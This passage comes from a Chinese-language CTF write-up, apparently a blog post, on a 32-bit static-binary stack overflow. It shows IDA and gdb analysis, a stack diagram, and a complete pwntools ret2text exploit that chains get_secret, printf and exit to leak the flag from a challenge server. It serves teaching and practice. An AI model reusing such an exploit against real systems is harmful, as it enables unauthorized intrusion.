+<h2 id="第三步：get-secret-只读不打印"><a href="#第三步：get-secret-只读不打印" class="headerlink" title="第三步：get_secret 只读不打印"></a>第三步：get_secret 只读不打印</h2><p>在 IDA 的函数列表里找到 <code>get_secret</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-3.png" alt="get_secret 伪代码"></p>
+<p><em>图 7：<code>get_secret</code> 只 <code>fgets</code> 到 <code>fl4g</code>，没有 <code>printf</code></em></p>
+<p>汇编也印证了这一点：</p>
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-6.png" alt="get_secret 汇编"></p>
+<p><em>图 8：<code>fgets</code> 的目标地址是 <code>0x80eca2d</code>，即全局变量 <code>fl4g</code></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x080489a0 &lt;+0&gt;:  push esi</span><br><span class="line">0x080489a1 &lt;+1&gt;:  sub  esp, 0x18</span><br><span class="line">0x080489a4 &lt;+4&gt;:  mov  DWORD PTR [esp+0x4], 0x80cf91b</span><br><span class="line">0x080489ac &lt;+12&gt;: mov  DWORD PTR [esp], 0x80bc2a8      ; &quot;flag.txt&quot;</span><br><span class="line">0x080489b3 &lt;+19&gt;: call 0x804f710 &lt;fopen&gt;</span><br><span class="line">0x080489b8 &lt;+24&gt;: mov  esi, eax</span><br><span class="line">0x080489ba &lt;+26&gt;: mov  DWORD PTR [esp+0x8], esi</span><br><span class="line">0x080489be &lt;+30&gt;: mov  DWORD PTR [esp+0x4], 0x2d        ; 45</span><br><span class="line">0x080489c6 &lt;+38&gt;: mov  DWORD PTR [esp], 0x80eca2d       ; &amp;fl4g</span><br><span class="line">0x080489cd &lt;+45&gt;: call 0x804f4c0 &lt;fgets&gt;</span><br><span class="line">0x080489d2 &lt;+50&gt;: mov  DWORD PTR [esp], esi</span><br><span class="line">0x080489d5 &lt;+53&gt;: call 0x804f190 &lt;fclose&gt;</span><br><span class="line">0x080489da &lt;+58&gt;: add  esp, 0x18</span><br><span class="line">0x080489dd &lt;+61&gt;: pop  esi</span><br><span class="line">0x080489de &lt;+62&gt;: ret</span><br></pre></td></tr></table></figure>
+
+<p>逐段看：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mov [esp], 0x80bc2a8</code></td>
+<td><code>fopen</code> 的第一个参数：字符串 <code>&quot;flag.txt&quot;</code></td>
+</tr>
+<tr>
+<td><code>mov [esp+0x4], 0x80cf91b</code></td>
+<td><code>fopen</code> 的第二个参数：打开模式</td>
+</tr>
+<tr>
+<td><code>call fopen</code></td>
+<td>打开文件，返回值（FILE*）放到 <code>eax</code></td>
+</tr>
+<tr>
+<td><code>mov esi, eax</code></td>
+<td>把 FILE* 存到 <code>esi</code></td>
+</tr>
+<tr>
+<td><code>mov [esp+0x8], esi</code></td>
+<td><code>fgets</code> 的第三个参数：FILE*</td>
+</tr>
+<tr>
+<td><code>mov [esp+0x4], 0x2d</code></td>
+<td><code>fgets</code> 的第二个参数：最多读 45 字节</td>
+</tr>
+<tr>
+<td><code>mov [esp], 0x80eca2d</code></td>
+<td><code>fgets</code> 的第一个参数：目标缓冲区 <code>&amp;fl4g</code></td>
+</tr>
+<tr>
+<td><code>call fgets</code></td>
+<td>把 flag 读进 <code>0x80eca2d</code></td>
+</tr>
+<tr>
+<td><code>call fclose</code></td>
+<td>关闭文件</td>
+</tr>
+</tbody></table>
+<p>关键点：<strong><code>fl4g</code> 是全局变量，地址固定在 <code>0x80eca2d</code>。</strong> 它不是栈上的局部变量，所以不会随着函数返回而失效，也不受 ASLR 影响（No PIE）。</p>
+<p><code>get_secret</code> 执行完之后：</p>
+<ul>
+<li><code>flag.txt</code> 的内容已经在 <code>0x80eca2d</code>；</li>
+<li>程序返回到调用者；</li>
+<li><strong>没有任何输出</strong>。</li>
+</ul>
+<p>所以只跳 <code>get_secret</code> 是不够的，必须再调用一个输出函数，把 <code>0x80eca2d</code> 当参数传进去。</p>
+<h2 id="第四步：找-printf-和-exit"><a href="#第四步：找-printf-和-exit" class="headerlink" title="第四步：找 printf 和 exit"></a>第四步：找 printf 和 exit</h2><h3 id="printf-的地址"><a href="#printf-的地址" class="headerlink" title="printf 的地址"></a>printf 的地址</h3><p>回看 <code>main</code> 的汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080489ea &lt;+10&gt;: call 0x804f0a0 &lt;printf&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>printf</code> 的地址就是 <strong><code>0x0804f0a0</code></strong>。</p>
+<p>因为程序是静态链接，这个地址就在程序自己的代码段里，不需要去外部 <code>libc.so</code> 里找。No PIE 又保证了它在远程也是同一个地址。</p>
+<h3 id="exit-的地址"><a href="#exit-的地址" class="headerlink" title="exit 的地址"></a>exit 的地址</h3><p>用 <code>objdump</code> 找：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./pwn7 | grep -i <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-7.png" alt="objdump 找 exit"></p>
+<p><em>图 9：<code>exit</code> 的入口在 <code>0x0804e660</code></em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0804e660 &lt;exit&gt;:</span><br></pre></td></tr></table></figure>
+
+<p>所以 <code>exit</code> 的地址是 <strong><code>0x0804e660</code></strong>。</p>
+<h3 id="为什么需要-exit"><a href="#为什么需要-exit" class="headerlink" title="为什么需要 exit"></a>为什么需要 exit</h3><p><code>printf</code> 的输出不是立刻写到屏幕上的，而是先放进 <strong>stdio 缓冲区</strong>：</p>
+<ul>
+<li>输出到终端时，通常是行缓冲，遇到换行就刷；</li>
+<li>输出到管道、socket、文件时，通常是<strong>全缓冲</strong>，缓冲区满了或者调用 <code>fflush</code> &#x2F; <code>exit</code> 才刷。</li>
+</ul>
+<p>远程 pwn 的连接就是 socket，属于全缓冲。如果 <code>printf</code> 打完 flag 后，程序返回到一个垃圾地址并崩溃，<strong>缓冲区里的内容可能还没发出去</strong>，你在本地就什么都收不到。</p>
+<p><code>exit</code> 会做两件事：</p>
+<ol>
+<li>刷新所有 stdio 缓冲区；</li>
+<li>终止进程。</li>
+</ol>
+<p>所以 payload 最后跳到 <code>exit</code>，保证 flag 被送出来。</p>
+<div class="note warning flat"><p><strong>不要用 <code>_exit</code> 代替 <code>exit</code>。</strong> <code>_exit</code> 是直接结束进程的系统调用，<strong>不会刷新 stdio 缓冲区</strong>。<code>exit</code> 是 C 库函数，会先 <code>fflush</code> 再 <code>_exit</code>。打印型后门用 <code>exit</code> 收尾，用 <code>_exit</code> 可能什么都看不到。</p>
+</div>
+
+<h2 id="第五步：画栈图，写-payload"><a href="#第五步：画栈图，写-payload" class="headerlink" title="第五步：画栈图，写 payload"></a>第五步：画栈图，写 payload</h2><h3 id="先理清-cdecl-的调用形状"><a href="#先理清-cdecl-的调用形状" class="headerlink" title="先理清 cdecl 的调用形状"></a>先理清 cdecl 的调用形状</h3><p>32 位 Linux 用 cdecl：</p>
+<ol>
+<li>调用者把参数<strong>从右往左</strong>压栈；</li>
+<li><code>call</code> 把返回地址压栈；</li>
+<li>被调函数执行时，<code>[esp]</code> 是返回地址，<code>[esp+4]</code> 是第一个参数，<code>[esp+8]</code> 是第二个参数；</li>
+<li>函数返回后，由<strong>调用者</strong>清理参数（<code>add esp, n</code>）。</li>
+</ol>
+<p>我们不是在写汇编，而是在栈上<strong>手工摆一个假的调用栈</strong>。<code>ret</code> 指令会从栈顶弹出一个地址当 <code>eip</code>，所以我们只要把“返回地址”和“参数”按顺序排好就行。</p>
+<h3 id="目标链"><a href="#目标链" class="headerlink" title="目标链"></a>目标链</h3><p>我们希望执行顺序是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main 返回 → get_secret() 读 flag → get_secret 返回 → printf(fl4g) → printf 返回 → exit</span><br></pre></td></tr></table></figure>
+
+<p>对应到栈上：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  fl4g 指针 (0x80eca2d)   |  &lt;- printf 的参数</span><br><span class="line">+--------------------------+</span><br><span class="line">|  exit (0x0804e660)       |  &lt;- printf 的返回地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  printf (0x0804f0a0)     |  &lt;- get_secret 的返回地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  get_secret (0x080489a0) |  &lt;- main 的返回地址（被覆盖）</span><br><span class="line">+--------------------------+</span><br><span class="line">|  45 字节填充             |</span><br><span class="line">+--------------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p>从下往上看：</p>
+<ol>
+<li><code>main</code> 的 <code>ret</code> 弹出 <code>get_secret</code>，跳到 <code>get_secret</code>；</li>
+<li><code>get_secret</code> 的 <code>ret</code> 弹出 <code>printf</code>，跳到 <code>printf</code>；</li>
+<li>此时栈顶是 <code>exit</code>（<code>printf</code> 的返回地址），栈顶下一个是 <code>fl4g</code>（<code>printf</code> 的参数）；</li>
+<li><code>printf</code> 按 cdecl 读 <code>[esp+4]</code> 作为第一个参数，也就是 <code>fl4g</code>，打印 flag；</li>
+<li><code>printf</code> 返回，跳到 <code>exit</code>，刷新缓冲区并结束。</li>
+</ol>
+<h3 id="写-exp"><a href="#写-exp" class="headerlink" title="写 exp"></a>写 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;new-window&quot;</span>]</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;27cbd01d5fff4706e26500ec.tcp-ctf2.dasctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">PADDING = <span class="number">45</span></span><br><span class="line">GET_SECRET = <span class="number">0x080489a0</span></span><br><span class="line">PRINTF = <span class="number">0x0804f0a0</span></span><br><span class="line">EXIT = <span class="number">0x0804e660</span></span><br><span class="line">FL4G = <span class="number">0x80eca2d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./pwn7&quot;, gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     b *main</span></span><br><span class="line"><span class="comment">#     continue</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * PADDING</span><br><span class="line">payload += p32(GET_SECRET)   <span class="comment"># main 的返回地址</span></span><br><span class="line">payload += p32(PRINTF)       <span class="comment"># get_secret 的返回地址</span></span><br><span class="line">payload += p32(EXIT)         <span class="comment"># printf 的返回地址</span></span><br><span class="line">payload += p32(FL4G)         <span class="comment"># printf 的参数</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Sending Payload (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>bytes)&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload 一共 <code>45 + 4 × 4 = 61</code> 字节，和运行输出里的 <code>61bytes</code> 对得上。</p>
+<p>逐行看：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>b&#39;A&#39; * 45</code></td>
+<td>填满 <code>v4</code>，一直到返回地址</td>
+</tr>
+<tr>
+<td><code>p32(GET_SECRET)</code></td>
+<td>覆盖 <code>main</code> 的返回地址，先跳到 <code>get_secret</code></td>
+</tr>
+<tr>
+<td><code>p32(PRINTF)</code></td>
+<td><code>get_secret</code> 执行完后的返回地址</td>
+</tr>
+<tr>
+<td><code>p32(EXIT)</code></td>
+<td><code>printf</code> 执行完后的返回地址</td>
+</tr>
+<tr>
+<td><code>p32(FL4G)</code></td>
+<td><code>printf</code> 的第一个参数，指向存 flag 的全局变量</td>
+</tr>
+</tbody></table>
+<div class="note info flat"><p><strong>为什么 <code>printf</code> 的参数放在 <code>EXIT</code> 后面？</strong> 因为 cdecl 的栈布局是“返回地址在前，参数在后”。<code>printf</code> 被 <code>ret</code> 进去时，<code>[esp]</code> 是它的返回地址 <code>exit</code>，<code>[esp+4]</code> 才是第一个参数。所以参数要排在 <code>EXIT</code> 的<strong>高地址方向</strong>，也就是 payload 的最后。</p>
+</div>
+
+<h2 id="第六步：gdb-验证栈布局"><a href="#第六步：gdb-验证栈布局" class="headerlink" title="第六步：gdb 验证栈布局"></a>第六步：gdb 验证栈布局</h2><p>写 exp 之前，最好在 gdb 里亲眼确认一遍。用 <code>gdb.debug</code> 或者手动下断点都行：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main+22</span><br><span class="line">pwndbg&gt; b *main+32</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure>
+
+<p><code>main+22</code> 停在 <code>call gets</code> 之前，<code>main+32</code> 停在 <code>ret</code>。输入完整 payload 后，在 <code>main+32</code> 看栈：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope $esp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-10.png" alt="gdb 查看栈布局"></p>
+<p><em>图 10：<code>telescope</code> 输出的栈布局，四个槽依次是 get_secret、printf、exit、fl4g</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00:0000 esp 0xfffb9780 -&gt; 0x80489a0 (get_secret) &lt;- push esi</span><br><span class="line">01:0004      0xfffb9784 -&gt; 0x804f0a0 (printf)</span><br><span class="line">02:0008      0xfffb9788 -&gt; 0x804e660 (exit) &lt;- sub esp, 0xc</span><br><span class="line">03:000c      0xfffb978c -&gt; 0x80eca2d (fl4g)</span><br><span class="line">04:0010      0xfffb9790 &lt;- 0x41414141 (&#x27;AAAA&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>逐个槽解释：</p>
+<table>
+<thead>
+<tr>
+<th>槽</th>
+<th>地址</th>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[esp]</code></td>
+<td><code>0xfffb9780</code></td>
+<td><code>0x80489a0</code></td>
+<td><code>main</code> 的返回地址，指向 <code>get_secret</code></td>
+</tr>
+<tr>
+<td><code>[esp+4]</code></td>
+<td><code>0xfffb9784</code></td>
+<td><code>0x804f0a0</code></td>
+<td><code>get_secret</code> 的返回地址，指向 <code>printf</code></td>
+</tr>
+<tr>
+<td><code>[esp+8]</code></td>
+<td><code>0xfffb9788</code></td>
+<td><code>0x804e660</code></td>
+<td><code>printf</code> 的返回地址，指向 <code>exit</code></td>
+</tr>
+<tr>
+<td><code>[esp+0xc]</code></td>
+<td><code>0xfffb978c</code></td>
+<td><code>0x80eca2d</code></td>
+<td><code>printf</code> 的参数，指向 <code>fl4g</code></td>
+</tr>
+<tr>
+<td><code>[esp+0x10]</code></td>
+<td><code>0xfffb9790</code></td>
+<td><code>0x41414141</code></td>
+<td>填充的 <code>A</code>，已经到缓冲区低地址方向</td>
+</tr>
+</tbody></table>
+<p><code>&lt;- push esi</code> 这条注释是 pwndbg 在提示：如果现在跳到 <code>get_secret</code>，它的第一条指令是 <code>push esi</code>。也就是说，<strong>断点还停在 <code>main+32</code> 的 <code>ret</code> 上，<code>ret</code> 还没执行</strong>；一旦执行，<code>esp</code> 会弹到 <code>printf</code> 那个槽。</p>
+<p>用 <code>bt</code> 也能看到当前还在 <code>main+32</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#0 0x8048a00 main+32</span><br><span class="line">#1 0x80489a0 get_secret</span><br></pre></td></tr></table></figure>
+
+<p>这个布局和我们画的栈图完全一致。<strong>偏移 45、四个槽的顺序都对上了，exp 就可以放心打远程了。</strong></p>
+<div class="note success flat"><p><strong>gdb 验证的意义</strong>：不是走形式。偏移算错、参数位置放反、少写一个返回地址，这些问题在本地一眼就能看出来；等到远程打不通再回头查，成本高得多。</p>
+</div>
+
+<h2 id="第七步：打远程，拿-flag"><a href="#第七步：打远程，拿-flag" class="headerlink" title="第七步：打远程，拿 flag"></a>第七步：打远程，拿 flag</h2><p>把 <code>HOST</code> 换成平台给的地址，运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pwn7.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/image-11.png" alt="运行 exp"></p>
+<p><em>图 11：payload 发送成功，flag 被 printf 打印出来</em></p>
+<p>输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 27cbd01d5fff4706e26500ec.tcp-ctf2.dasctf.com on port 9999: Done</span><br><span class="line">[*] Sending Payload (61bytes)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">b0r4 v3r s3 7u 4h o b1ch4o m3m0... CTF2&#123;6f7ca70d-79fa-4834-affe-59b333f1206d&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
+
+<p>一行一行看：</p>
+<table>
+<thead>
+<tr>
+<th>输出</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Opening connection ... Done</code></td>
+<td><code>remote</code> 连上靶机，<code>ssl=True</code> 表示走 TLS</td>
+</tr>
+<tr>
+<td><code>Sending Payload (61bytes)</code></td>
+<td>45 填充 + 4 个 4 字节地址</td>
+</tr>
+<tr>
+<td><code>b0r4 ...</code></td>
+<td>程序自己的提示语</td>
+</tr>
+<tr>
+<td><code>CTF2&#123;...&#125;</code></td>
+<td><code>printf(fl4g)</code> 打印出来的 flag</td>
+</tr>
+<tr>
+<td><code>Got EOF while reading in interactive</code></td>
+<td><code>exit</code> 结束了进程，连接关闭</td>
+</tr>
+</tbody></table>
+<p>flag：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;6f7ca70d-79fa-4834-affe-59b333f1206d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么最后是-EOF，不是-shell"><a href="#为什么最后是-EOF，不是-shell" class="headerlink" title="为什么最后是 EOF，不是 shell"></a>为什么最后是 EOF，不是 shell</h3><p>因为这题没有 <code>system(&quot;/bin/sh&quot;)</code>。我们的链最后跳到 <code>exit</code>，它刷新缓冲区后直接结束进程，不会停在 <code>$</code> 提示符上。</p>
+<p><code>Got EOF</code> 是预期行为，不是 exp 写错了。flag 已经打印出来，进程正常退出，目的就达到了。</p>
+<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="1-32-位-cdecl-的调用栈"><a href="#1-32-位-cdecl-的调用栈" class="headerlink" title="1. 32 位 cdecl 的调用栈"></a>1. 32 位 cdecl 的调用栈</h3><p>32 位 Linux 默认使用 cdecl 调用约定：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用者：</span><br><span class="line">  push 参数2</span><br><span class="line">  push 参数1</span><br><span class="line">  call func        ; 压入返回地址</span><br><span class="line">  add  esp, 8      ; 调用者清理参数</span><br><span class="line"></span><br><span class="line">被调函数：</span><br><span class="line">  [esp]     = 返回地址</span><br><span class="line">  [esp+4]   = 参数1</span><br><span class="line">  [esp+8]   = 参数2</span><br></pre></td></tr></table></figure>
+
+<p>画成图：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+------------------+</span><br><span class="line">| 参数2            |</span><br><span class="line">+------------------+</span><br><span class="line">| 参数1            |</span><br><span class="line">+------------------+</span><br><span class="line">| 返回地址         |  &lt;- esp</span><br><span class="line">+------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p>我们的 payload 就是手工搭出来的这个形状：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[45 填充][get_secret][printf][exit][fl4g]</span><br><span class="line">                    ↑        ↑      ↑</span><br><span class="line">              返回地址   返回地址  参数</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-ret2text、静态链接、NX、PIE"><a href="#2-ret2text、静态链接、NX、PIE" class="headerlink" title="2. ret2text、静态链接、NX、PIE"></a>2. ret2text、静态链接、NX、PIE</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>本题情况</th>
+<th>对利用的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ret2text</strong></td>
+<td>程序里有 <code>get_secret</code>、<code>printf</code></td>
+<td>直接返回到现有代码，不写 shellcode</td>
+</tr>
+<tr>
+<td><strong>静态链接</strong></td>
+<td>libc 函数在程序里</td>
+<td>函数地址固定，不用泄露 libc</td>
+</tr>
+<tr>
+<td><strong>NX</strong></td>
+<td>开启</td>
+<td>栈不可执行，放弃 shellcode</td>
+</tr>
+<tr>
+<td><strong>PIE</strong></td>
+<td>关闭</td>
+<td>代码段基址固定，地址可以写死</td>
+</tr>
+<tr>
+<td><strong>Canary</strong></td>
+<td>关闭</td>
+<td>可以直接覆盖返回地址</td>
+</tr>
+</tbody></table>
+<p>这四者组合起来，最自然的路线就是：<strong>栈溢出 + 返回到现有函数 + 手工传参</strong>。</p>
+<h3 id="3-偏移计算：为什么是-45"><a href="#3-偏移计算：为什么是-45" class="headerlink" title="3. 偏移计算：为什么是 45"></a>3. 偏移计算：为什么是 45</h3><p>通用公式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偏移 = 返回地址的位置 - 缓冲区的起始位置</span><br></pre></td></tr></table></figure>
+
+<p>本题：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回地址 = esp + 0x3c     （sub esp,0x3c 之后）</span><br><span class="line">缓冲区   = esp + 0xf      （lea eax,[esp+0xf]）</span><br><span class="line">偏移     = 0x3c - 0xf = 0x2d = 45</span><br></pre></td></tr></table></figure>
+
+<p>和前面几题对比：</p>
+<table>
+<thead>
+<tr>
+<th>题目</th>
+<th>架构</th>
+<th>缓冲区位置</th>
+<th>返回地址位置</th>
+<th>偏移</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>warmup_csaw_2016</td>
+<td>64 位</td>
+<td><code>rbp-0x40</code></td>
+<td><code>rbp+8</code></td>
+<td><code>0x40 + 8 = 72</code></td>
+</tr>
+<tr>
+<td>get_started_3dsctf_2016</td>
+<td>32 位</td>
+<td><code>esp+4</code></td>
+<td><code>esp+0x3c</code></td>
+<td><code>0x3c - 4 = 56</code></td>
+</tr>
+<tr>
+<td><strong>本题</strong></td>
+<td>32 位</td>
+<td><code>esp+0xf</code></td>
+<td><code>esp+0x3c</code></td>
+<td><code>0x3c - 0xf = 45</code></td>
+</tr>
+</tbody></table>
+<p>同样是 <code>sub esp,0x3c</code>，缓冲区放在 <code>esp+4</code> 还是 <code>esp+0xf</code>，偏移就差了 11 字节。<strong>偏移永远对着汇编算，不要背数字。</strong></p>
+<h3 id="4-printf-的缓冲区和-exit"><a href="#4-printf-的缓冲区和-exit" class="headerlink" title="4. printf 的缓冲区和 exit"></a>4. printf 的缓冲区和 exit</h3><p>C 标准库的 <code>stdout</code> 有三种缓冲模式：</p>
+<table>
+<thead>
+<tr>
+<th>模式</th>
+<th>触发条件</th>
+<th>什么时候刷新</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>行缓冲</td>
+<td>输出到终端</td>
+<td>遇到 <code>\n</code>、缓冲区满、<code>fflush</code></td>
+</tr>
+<tr>
+<td>全缓冲</td>
+<td>输出到文件&#x2F;socket&#x2F;管道</td>
+<td>缓冲区满、<code>fflush</code>、<code>exit</code></td>
+</tr>
+<tr>
+<td>无缓冲</td>
+<td><code>stderr</code> 或 <code>setbuf(stdout, NULL)</code></td>
+<td>立即输出</td>
+</tr>
+</tbody></table>
+<p>远程 pwn 是 socket，通常全缓冲。如果程序在 <code>printf</code> 之后崩溃，缓冲区里的 flag 可能还没发出去。<code>exit</code> 会刷新缓冲区，所以打印型后门通常用它收尾。</p>
+<p>其他收尾方式：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>是否刷新</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exit</code></td>
+<td>✅</td>
+<td>刷新 stdio 后终止</td>
+</tr>
+<tr>
+<td><code>_exit</code></td>
+<td>❌</td>
+<td>直接系统调用终止</td>
+</tr>
+<tr>
+<td><code>fflush(stdout)</code></td>
+<td>✅</td>
+<td>只刷新，不终止；后面还得接返回地址</td>
+</tr>
+<tr>
+<td><code>puts</code></td>
+<td>取决于缓冲</td>
+<td><code>puts</code> 自己会加换行，但不保证立即刷</td>
+</tr>
+<tr>
+<td>正常返回</td>
+<td>✅</td>
+<td>程序正常结束会刷新</td>
+</tr>
+</tbody></table>
+<h3 id="5-找函数地址的几种方法"><a href="#5-找函数地址的几种方法" class="headerlink" title="5. 找函数地址的几种方法"></a>5. 找函数地址的几种方法</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>命令</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IDA</td>
+<td>函数列表 &#x2F; 反汇编</td>
+<td>有 GUI，最直观</td>
+</tr>
+<tr>
+<td><code>objdump</code></td>
+<td><code>objdump -d ./pwn7 | grep -i exit</code></td>
+<td>命令行快速定位</td>
+</tr>
+<tr>
+<td><code>readelf</code></td>
+<td><code>readelf -s ./pwn7 | grep exit</code></td>
+<td>看符号表</td>
+</tr>
+<tr>
+<td>pwntools</td>
+<td><code>ELF(&#39;./pwn7&#39;).symbols[&#39;get_secret&#39;]</code></td>
+<td>写 exp 时动态取</td>
+</tr>
+<tr>
